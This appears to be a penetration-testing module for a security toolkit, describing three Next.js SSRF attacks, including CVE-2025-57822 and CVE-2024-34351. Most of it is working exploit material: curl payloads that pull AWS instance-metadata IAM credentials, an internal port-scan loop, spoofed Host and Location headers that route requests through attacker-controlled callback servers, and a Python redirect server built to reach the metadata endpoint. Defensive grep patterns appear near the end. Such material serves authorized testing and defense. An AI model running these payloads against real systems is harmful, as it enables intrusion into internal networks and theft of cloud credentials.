# VULN MODULE — Next.js SSRF Attack Surfaces
# Asset: webapp
# CWE-918 | Report prefix: WEB-SSRF
# See also: ssrf_filter_evasion.md (IP bypass), open_redirect.md (redirect chain)

## THREAT MODEL

Next.js (~13M weekly npm downloads) exposes three distinct SSRF primitives that are
independent of application logic. Each abuses a built-in framework feature:

1. **Image optimization endpoint** (`/_next/image`) — proxies arbitrary URLs server-side
2. **Middleware `next()` header injection** (CVE-2025-57822) — `Location` header followed
3. **Server Actions Host header injection** (CVE-2024-34351) — spoofed `Host` triggers HEAD→GET to attacker

All three can reach cloud metadata endpoints (AWS IMDSv1 `169.254.169.254`), internal
services, and may escalate to RCE in certain configurations.

---

## FINGERPRINTING NEXT.JS

```bash
# HTTP header
curl -sI https://target.com/ | grep -i "x-powered-by\|next"

# Characteristic paths — any of these confirm Next.js
curl -s -o /dev/null -w "%{http_code}" https://target.com/_next/static/
curl -s -o /dev/null -w "%{http_code}" https://target.com/_next/image?url=x&w=64&q=75

# Version detection via package files (whitebox)
grep '"next"' package.json package-lock.json 2>/dev/null

# Version detection via build manifest (blackbox)
curl -s https://target.com/_next/static/chunks/framework-*.js | grep -oP '"version":"\K[^"]+' | head -1
```

---

## ATTACK 1 — Image Optimization SSRF (`/_next/image`)

### How it works
Next.js exposes `/_next/image?url=<URL>&w=<width>&q=<quality>` which fetches and
optimizes remote images server-side. If `remotePatterns` is a wildcard, any URL is fetched.

### Vulnerable configuration (next.config.js)
```javascript
// VULNERABLE — wildcard allows any host
module.exports = {
  images: {
    remotePatterns: [
      { protocol: 'https', hostname: '**' },
      { protocol: 'http',  hostname: '**' },
    ],
  },
}
```

### Payloads
```bash
# AWS IMDSv1 — IAM credentials
curl "https://target.com/_next/image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&w=64&q=75"

# Internal network probe
curl "https://target.com/_next/image?url=http://192.168.1.1/&w=64&q=75"

# OAST callback — confirm SSRF
curl "https://target.com/_next/image?url=http://YOUR.COLLABORATOR.NET/ssrf-test&w=64&q=75"

# URL encoding bypass (if basic filter on url param)
curl "https://target.com/_next/image?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F&w=64&q=75"
```

### Whitelist bypass via redirect chain
Even with a specific allowlist (no wildcard), the image endpoint **follows redirects by default**.

```bash
# 1. Find an open redirect on a whitelisted host (CDN, image service, etc.)
# 2. Chain through it:
curl "https://target.com/_next/image?url=https://whitelisted-cdn.com/redirect?to=http://169.254.169.254/latest/meta-data/&w=64&q=75"
```

### Detection (whitebox)
```bash
grep -rn "remotePatterns\|domains.*\*\*\|hostname.*\*\*" next.config.js next.config.ts next.config.mjs 2>/dev/null
# Any hostname: '**' entry = wildcard SSRF
```

---

## ATTACK 2 — Middleware Location Header Injection (CVE-2025-57822)

### How it works
Next.js Middleware runs before every response. If the middleware passes unsanitized
request headers to `next()`, the framework evaluates the `Location` header from the
request and follows it — fetching an arbitrary resource server-side.

### Vulnerable middleware pattern
```javascript
// middleware.js — VULNERABLE
import { NextResponse } from 'next/server'
export function middleware(request) {
  // Developer passes entire request (including attacker headers) to next()
  return NextResponse.next({ request })
}
```

### Exploit
```http
GET /any-path HTTP/1.1
Host: target.com
Location: http://169.254.169.254/latest/meta-data/
```

```bash
# Confirm with OAST callback
curl -s "https://target.com/" \
  -H "Location: http://YOUR.COLLABORATOR.NET/cve-2025-57822"

# AWS metadata
curl -s "https://target.com/" \
  -H "Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Internal service enumeration
for port in 80 443 8080 8443 3000 5000 6379 9200; do
  curl -s "https://target.com/" \
    -H "Location: http://127.0.0.1:${port}/" \
    -o /dev/null -w "Port ${port}: %{http_code}\n"
done
```

### Notes
- CVE discovered by Dominik Prodinger
- **5,000+ vulnerable hosts** identified on the internet at disclosure
- Can escalate to **RCE** in certain configurations (see Intigriti CTF write-up)
- Path-agnostic: any endpoint that invokes middleware is sufficient

---

## ATTACK 3 — Server Actions Host Header Injection (CVE-2024-34351)

### Affected versions
- **Next.js ≤ 14.1.1**, **self-hosted only** (Vercel-hosted is not affected)
- Requires the app to use **Server Actions** with a **relative path redirect**

### How it works
When a Server Action triggers a relative redirect, Next.js:
1. Sends a **HEAD request** to the host in the incoming `Host` header to validate `Content-Type`
2. Sends a **GET request** to the same host and follows any `Location` redirect

An attacker who controls the `Host` header can point the HEAD→GET chain at their OAST
server, then redirect the GET to an internal target.

### Attack chain
```
Attacker                    Target Next.js              OAST Server / Internal
   |                              |                            |
   |-- POST /server-action ------>|                            |
   |   Host: attacker.oast.net    |                            |
   |                              |-- HEAD attacker.oast.net ->|
   |                              |<-- 200 Content-Type: text/x-component --|
   |                              |-- GET  attacker.oast.net ->|
   |                              |<-- 302 Location: http://169.254.169.254/latest/meta-data/ --|
   |                              |-- GET 169.254.169.254/... -> (internal)
```

### Exploit setup
```python
#!/usr/bin/env python3
"""cve_2024_34351_server.py — OAST server for CVE-2024-34351"""
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_HEAD(self):
        # Step 1: return correct Content-Type to pass Next.js validation
        self.send_response(200)
        self.send_header('Content-Type', 'text/x-component')
        self.end_headers()

    def do_GET(self):
        # Step 2: redirect to internal target
        self.send_response(302)
        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')
        self.end_headers()

    def log_message(self, fmt, *args):
        print(f"[*] {self.command} from {self.client_address[0]}: {self.path}")
        print(f"    Headers: {dict(self.headers)}")

HTTPServer(('0.0.0.0', 80), Handler).serve_forever()
```

```bash
# Trigger the exploit — spoof Host to your OAST server
curl -s "https://target.com/server-action-endpoint" \
  -X POST \
  -H "Host: YOUR_OAST_IP" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "1_formData=..."

# If direct Host header is blocked by CDN, try:
# X-Forwarded-Host: YOUR_OAST_IP
# X-Host: YOUR_OAST_IP
```

### Detecting Server Actions (blackbox)
```bash
# Server Actions submit as POST with specific content-type
grep -r "use server" --include="*.js" --include="*.ts" --include="*.tsx" .
# Or look for POST endpoints that return text/x-component or application/json with action data

# Blackbox: submit a POST request to any route with:
curl -X POST "https://target.com/any-page" \
  -H "Next-Action: <action-id>" \
  -H "Content-Type: application/x-www-form-urlencoded"
# A 200 with "text/x-component" response = Server Actions present
```

---

## COMBINED TESTING WORKFLOW

```bash
TARGET="https://target.com"
COLLAB="YOUR.COLLABORATOR.NET"

# Step 1 — Confirm Next.js
curl -sI "$TARGET" | grep -i next
curl -s -o /dev/null -w "%{http_code}" "$TARGET/_next/image?url=x&w=64&q=75"

# Step 2 — Test /_next/image SSRF
curl -s "$TARGET/_next/image?url=http://$COLLAB/img-probe&w=64&q=75"

# Step 3 — Test middleware Location injection (CVE-2025-57822)
curl -s "$TARGET/" -H "Location: http://$COLLAB/middleware-probe"

# Step 4 — Test Server Actions (CVE-2024-34351) — find action endpoints first
curl -s "$TARGET" | grep -oE '"action":"[^"]*"'
# Then trigger with spoofed Host
curl -X POST "$TARGET/found-action" \
  -H "Host: $COLLAB" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Step 5 — Escalate to AWS metadata if any SSRF confirmed
curl -s "$TARGET/_next/image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&w=64&q=75"
```

---

## WHITEBOX GREP PATTERNS

```bash
# Detect vulnerable next.config.js image settings
grep -rn "hostname.*'\*\*'" next.config.* 2>/dev/null
grep -rn "remotePatterns" next.config.* 2>/dev/null | grep -A3 "hostname"

# Detect vulnerable middleware patterns
grep -rn "NextResponse.next\|next()" middleware.js middleware.ts 2>/dev/null -A5
# Flag any middleware that passes request object with unsanitized headers

# Detect Server Actions
grep -rn "'use server'\|\"use server\"" --include="*.ts" --include="*.tsx" --include="*.js" .

# Detect version (check package.json)
python3 -c "
import json; d=json.load(open('package.json'))
v=d.get('dependencies',{}).get('next','')
print(f'Next.js version: {v}')
if v and any(v.startswith(p) for p in ['14.0','14.1.0','14.1.1']):
    print('VULNERABLE to CVE-2024-34351')
"
```

---

## IMPACT

| Vulnerability | CVE | Severity | Impact |
|---------------|-----|----------|--------|
| `/_next/image` wildcard SSRF | — | High | Internal network access, cloud metadata |
| `/_next/image` + redirect chain | — | High | Bypass allowlist, internal access |
| Middleware Location injection | CVE-2025-57822 | High/Critical | SSRF → potential RCE |
| Server Actions Host injection | CVE-2024-34351 | High | SSRF → cloud metadata → credential theft |

---

## AUTO-LOAD TRIGGERS

Load this module automatically when:
- `/_next/` paths found in HTTP responses (confirms Next.js)
- `X-Powered-By: Next.js` header present
- `next` found in `package.json` dependencies
- `/_next/image` endpoint responds (any status)
- Any Next.js version ≤ 14.1.1 detected → prioritize CVE-2024-34351
